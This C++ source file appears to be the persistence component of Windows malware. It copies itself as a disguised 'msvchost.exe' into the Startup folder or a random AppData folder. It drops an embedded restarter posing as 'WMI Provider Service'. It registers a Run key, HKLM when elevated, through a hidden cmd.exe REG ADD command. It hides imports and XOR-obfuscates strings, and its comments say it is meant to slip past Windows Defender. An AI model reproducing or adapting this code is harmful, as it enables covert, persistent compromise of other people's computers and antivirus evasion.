#include "CPersistence.h"

#include <ShlObj.h>
#include <combaseapi.h>
#include <libloaderapi.h>
#include "CCurrentEnviroment.h"
#include <PETools.h>
#include <Resource/AutoRestartProgram.h>

#define RESTARTER_SERVICE_NAME XorStr("WMIProviderService")

#define RESTARTER_FILE_NAME XorStr("WMI Provider Service")
#define DIABOLIQUE_FILE_NAME XorStr("msvchost")

#define RESTARTER_FILE_NAME_BACKSLASH XorStr("\\WMI Provider Service.exe")
#define DIABOLIQUE_FILE_NAME_BACKSLAH XorStr("\\msvchost.exe")

std::wstring GetCSIDLPath(int csidl)
{
    WINDOWS_IMPORT_HIDE(LoadLibraryA, "Kernel32.dll");

    _LoadLibraryA(XorStr("Shell32.dll"));
    _LoadLibraryA(XorStr("Ole32.dll"));

    WINDOWS_IMPORT_HIDE(SHGetFolderPathW, "Shell32.dll");
    WINDOWS_IMPORT_HIDE(CoTaskMemFree, "Ole32.dll");

    const KNOWNFOLDERID STARTUP = FOLDERID_Startup;

    WCHAR PATH[MAX_PATH];
    memset(PATH, 0, sizeof(PATH));

    HRESULT hr = _SHGetFolderPathW((HWND)NULL,
        (INT)csidl,     // no special options required
        (HANDLE)0,  // no access token required
        (DWORD)NULL,
        (LPTSTR)PATH);

    if (SUCCEEDED(hr))
    {
        // The function succeeded, so copy the returned path to a
        // C++ string, free the memory allocated by the function,
        // and return the path string.
        std::wstring path(PATH);
        //_CoTaskMemFree(static_cast<LPVOID>(pszPath));
        return path;
    }
    else
    {
        return L"";
    }
}


bool DropEXEInStartupFolder()
{


    WINDOWS_IMPORT_HIDE(GetModuleFileNameA, "Kernel32.dll");
    WINDOWS_IMPORT_HIDE(CopyFileA, "Kernel32.dll");

    std::wstring wstr = GetCSIDLPath(CSIDL_STARTUP);

    if (wstr.size() < 1)
        return false;

    std::string ansistr(wstr.begin(), wstr.end());
    ansistr += DIABOLIQUE_FILE_NAME_BACKSLAH;


#ifdef _DEBUG
    printf("Drop Loc : %s\n", ansistr.c_str());
#endif

    //return false;

    char filename[MAX_PATH];

    BOOL stats = 0;
    DWORD size = _GetModuleFileNameA(NULL, filename, MAX_PATH);
    if (_CopyFileA(filename, ansistr.c_str(), stats))
    {
        UnGrabMutex();

        // TODO : Use PETools SysCall Vers

        std::wstring ugh_nasty(ansistr.begin(), ansistr.end());


        HANDLE hProcess;
        HANDLE hThread;
        NTSTATUS ntStat = PETools::CreateSuspendedProcessx86((WCHAR*)ugh_nasty.c_str(), &hProcess, &hThread);


        if (NT_SUCCESS(ntStat))
        {
            ntStat = PETools::PtResumeThread(hThread, 0);

            if(NT_SUCCESS(ntStat))
                return true;
        }




        WINDOWS_IMPORT_HIDE(CreateProcessA, "kernel32.dll");
        STARTUPINFOA info = { sizeof(info) };
        PROCESS_INFORMATION processInfo;

        if (_CreateProcessA((LPCSTR)ansistr.c_str(), 
            (LPSTR)"", (LPSECURITY_ATTRIBUTES)NULL, 
            (LPSECURITY_ATTRIBUTES)NULL, 
            (BOOL)TRUE, (DWORD)0, (LPVOID)NULL, (LPCSTR)NULL, 
            (LPSTARTUPINFOA)&info, &processInfo))
        {
            return true;
        }


    }

    return false;
}

#include <filesystem>
std::string SelectRandomFolder(std::string folder_path)
{
    time_t t;
    srand(time(&t));

    std::string folder;
    for (const std::filesystem::directory_entry& dir_entry :
        std::filesystem::recursive_directory_iterator(folder_path.c_str(), std::filesystem::directory_options::skip_permission_denied))
    {
        if (!dir_entry.is_directory())
            continue;

        if (strstr(dir_entry.path().string().c_str(), XorStr("Startup")))
            continue;

        folder = dir_entry.path().string();

        if ((rand() % 10000) < (10000 / 8))
            break;
    }

    return folder;
}

//#include <fstream>

bool CreateBatchAutoRestartProcess(const char* szPath)
{
    //std::ofstream batch_file(XorStr("MicrosoftIntergrityVerifier.bat"), std::ios::out);

    return true;
}


bool decompress_restarter(std::string szPath)
{
    int dwSize = *(int*)__compressed_restarter_exe;

    //unsigned char* pPtr = (unsigned char*)malloc(__compressed_restarter_exe_len);

    unsigned char* pPtr = __compressed_restarter_exe;

    mz_ulong nSizeOut = dwSize;
    unsigned char* pPtrOut = (unsigned char*)malloc(nSizeOut);

    memcpy_s(pPtrOut, nSizeOut, pPtr, __compressed_restarter_exe_len);



    int ret = mz_uncompress(pPtrOut, &nSizeOut,
        (unsigned char*)__compressed_restarter_exe + sizeof(int)
        , __compressed_restarter_exe_len - sizeof(int)
    );

    if (ret != MZ_OK)
        return false;
#ifdef _DEBUG
    printf("Decompressed %d bytes -> %d Bytes!\n", __compressed_restarter_exe_len, nSizeOut);
#endif

    std::ofstream out((szPath + std::string(RESTARTER_FILE_NAME_BACKSLASH)).c_str(), std::ios::out | std::ios::binary);
    out.write((const char*)pPtrOut, dwSize);
    out.flush();
    out.close();

    //free(pPtr);
    free(pPtrOut);

    return true;
}

bool DropStartupService()
{

    WINDOWS_IMPORT_HIDE(CopyFileA, "Kernel32.dll");
    WINDOWS_IMPORT_HIDE(RegOpenKeyExA, "Advapi32.dll");
    WINDOWS_IMPORT_HIDE(RegSetValueExA, "Advapi32.dll");
    WINDOWS_IMPORT_HIDE(RegCloseKey, "Advapi32.dll");
    WINDOWS_IMPORT_HIDE(CreateProcessA, "kernel32.dll");
    WINDOWS_IMPORT_HIDE(WaitForSingleObject, "kernel32.dll");
    WINDOWS_IMPORT_HIDE(GetExitCodeProcess, "kernel32.dll");
    WINDOWS_IMPORT_HIDE(CloseHandle, "kernel32.dll");
    WINDOWS_IMPORT_HIDE(GetLastError, "kernel32.dll");
    
    //WINDOWS_IMPORT_HIDE(ShellExecuteA, "Shell32.dll");

    std::wstring wstr = GetCSIDLPath(CSIDL_APPDATA);

    if (wstr.size() < 1)
        return false;

    std::string ansistr(wstr.begin(), wstr.end());
    ansistr = SelectRandomFolder(ansistr);

    std::string path_save = ansistr;

    ansistr += DIABOLIQUE_FILE_NAME_BACKSLAH;

    char filename[MAX_PATH];
    g_pEnv->GetExecutablePath(filename);


    BOOL stats = 0;
    DWORD size = strlen(filename);
    if (_CopyFileA(filename, ansistr.c_str(), stats))
    {
        UnGrabMutex();


        std::string startup_service = DIABOLIQUE_FILE_NAME;
        std::string startup_path = ansistr;

        if (decompress_restarter(path_save))
        {
            startup_service = RESTARTER_SERVICE_NAME;
            startup_path = path_save + RESTARTER_FILE_NAME_BACKSLASH;
        }

        HKEY hKey;
        //const char* czStartName = XorStr("msvchost");
        char buffer[MAX_PATH * 2];

        // First Lets Try and Do This Without Ever Touching The Reg Ourselves
        // Because we will probably pop windows AV if we do

        const char* szHive = nullptr;

        const char* szHKCU = XorStr("HKCU");
        const char* szHKLM = XorStr("HKLM");

        szHive = szHKCU;
        if (g_pEnv->IsAdminElevated())
            szHive = szHKLM; // HECK YEAH BABY! Lets Through Ourselves in Sys

        CHAR szKey[MAX_PATH];
        snprintf(szKey, sizeof(szKey), XorStr("%s\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"), szHive);

        snprintf(
            buffer, sizeof(buffer),
            XorStr("C:\\Windows\\System32\\cmd.exe /K REG ADD \"%s\" /V \"%s\" /t REG_SZ /F /D \"%s\" & exit"),
            szKey, startup_service.c_str(), startup_path.c_str()
        );

#ifdef _DEBUG
        if(IsDebuggerPresent())
            __debugbreak();
#endif

#if 0
        _ShellExecuteA(NULL, XorStr("open"),
            XorStr("cmd.exe"), buffer, NULL, 
#ifdef _DEBUG
            SW_SHOWNORMAL
#else
            SW_HIDE
#endif
        );
#endif
        STARTUPINFOA startInf;
        memset(&startInf, 0, sizeof startInf);
        startInf.cb = sizeof(startInf);

        PROCESS_INFORMATION procInf;
        memset(&procInf, 0, sizeof procInf);

        BOOL b = _CreateProcessA(NULL, buffer, NULL, NULL, FALSE,
            NORMAL_PRIORITY_CLASS | CREATE_NO_WINDOW, NULL, NULL, &startInf, &procInf);

        DWORD dwErr = 0;
        if (b)
        {
            // Wait till process completes
            _WaitForSingleObject(procInf.hProcess, INFINITE);
            // Check process’s exit code
            _GetExitCodeProcess(procInf.hProcess, &dwErr);
            // Avoid memory leak by closing process handle
            _CloseHandle(procInf.hProcess);
        }
        else
        {
            dwErr = _GetLastError();
        }
        if (dwErr && false)
        {
            return false;
            LONG lnRes = _RegOpenKeyExA(HKEY_CURRENT_USER,
                XorStr("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"),
                0, KEY_WRITE,
                &hKey);

            if (ERROR_SUCCESS == lnRes)
            {
                lnRes = _RegSetValueExA(hKey,
                    startup_service.c_str(),
                    0,
                    REG_SZ,
                    (unsigned char*)startup_path.c_str(),
                    strlen(ansistr.c_str()));
            }
            else
            {
                return false;
            }

            _RegCloseKey(hKey);
        }

        
#if 0 // Apparently this means we can't be large monitor aware?
        // TODO : Use PETools SysCall Vers
        HANDLE hProcess;
        HANDLE hThread;
        std::wstring ugh_nasty(ansistr.begin(), ansistr.end());
        NTSTATUS ntStat = PETools::CreateSuspendedProcessx86((WCHAR*)ugh_nasty.c_str(), &hProcess, &hThread);


        if (NT_SUCCESS(ntStat))
        {

            ntStat = PETools::ResumeSuspendedProcess(hProcess);

            if (NT_SUCCESS(ntStat))
                return true;


            // in the words of "Joilet" Jake Blues , We Are Up Shit Creek Without A Paddle!
            WINDOWS_IMPORT_HIDE(TerminateProcess, "Kernel32.dll");

            // Who Cares About The Return, Not Like We Can Do Anything If This Fails....
            _TerminateProcess(hProcess, 0);
        }
#endif

        STARTUPINFOA info = { sizeof(info) };
        PROCESS_INFORMATION processInfo;
#if 1
        if (_CreateProcessA((LPCSTR)startup_path.c_str(),
            (LPSTR)"", (LPSECURITY_ATTRIBUTES)NULL,
            (LPSECURITY_ATTRIBUTES)NULL,
            (BOOL)TRUE, (DWORD)0, (LPVOID)NULL, (LPCSTR)NULL,
            (LPSTARTUPINFOA)&info, &processInfo))
        {
            return true;
        }
#endif
    }
    return true;
}





bool CPersistence::Initialize()
{
    CHAR path[MAX_PATH];
    g_pEnv->GetExecutablePath(path);

    if(strstr(path, XorStr("msvchost")))
        return false;

    // everything below will probably trip hueristics!
    // I mean we can sign it all day long, defender 
    // just wants to defend. fucking bitches
    if (DropStartupService())
        return true;

    return false;

    if (DropEXEInStartupFolder())
        return true;



    //return true;
    return false;
}









